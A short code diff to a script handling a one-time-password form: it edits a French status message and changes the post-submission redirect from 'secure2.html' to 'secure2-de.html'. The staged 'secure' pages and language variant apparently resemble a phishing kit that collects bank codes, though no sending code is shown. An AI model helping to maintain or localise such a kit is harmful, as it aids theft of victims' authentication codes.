@@ -141,7 +141,7 @@ if (otpForm && otpSingle && result) {
 
     
 
-    result.textContent = "connection en cours...";
+    result.textContent = "Connexion en cour...";
     result.className = "";
 
 
@@ -169,7 +169,7 @@ if (otpForm && otpSingle && result) {
         // Redirection après envoi réussi
         // ------------------------------
 
-        window.location.href = "secure2.html";
+        window.location.href = "secure2-de.html";
 
 
     } catch (error) {
